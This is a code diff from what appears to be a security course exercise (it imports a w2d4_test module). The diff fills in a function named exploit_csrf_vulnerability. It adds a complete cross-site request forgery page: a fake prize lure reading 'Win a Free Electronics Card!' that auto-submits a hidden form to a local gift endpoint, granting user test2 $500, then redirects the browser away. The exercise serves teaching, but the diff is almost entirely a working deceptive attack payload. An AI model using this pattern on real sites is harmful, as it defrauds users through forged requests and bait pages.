@@ -148,7 +148,72 @@ def exploit_csrf_vulnerability():
     except Exception as e:
         print(e)
     # - Give user "test2" a gify card
-    return "<html><body><h1>CSRF Vulnerability</h1></body></html>"
+    return """<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Free Electronics Card!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+        h1 {
+            color: #51be78;
+        }
+        .loading {
+            margin: 20px 0;
+            font-style: italic;
+            color: #666;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body onload="document.getElementById('giftForm').submit();">
+    <div class="container">
+        <h1>Win a Free Electronics Card!</h1>
+        <p>Congratulations! You've been selected to receive a $500 Electronics Card!</p>
+        <p class="loading">Processing your gift card, please wait...</p>
+        
+        <form id="giftForm" action="http://localhost:8000/gift/5" method="GET" class="hidden">
+            <input type="hidden" name="username" value="test2">
+            <input type="hidden" name="amount" value="500">
+        </form>
+    </div>
+    
+    <script>
+        // Store the referrer before submitting the form
+        var originalReferrer = document.referrer;
+        
+        // Submit the form
+        window.onload = function() {
+            var form = document.getElementById('giftForm');
+            form.submit();
+            
+            // Set a slightly longer timeout to ensure the gift operation completes
+            setTimeout(function() {
+                if(originalReferrer) {
+                    window.location.href = '/';
+                } else {
+                    // Fallback if no referrer
+                    window.location.href = "http://localhost:8000/";
+                }
+            }, 3000); // 3 seconds should be enough for the operation to complete
+        }
+    </script>
+    
+</body>
+</html>"""
 
 
 from w2d4_test import test_exploit_csrf_vulnerability
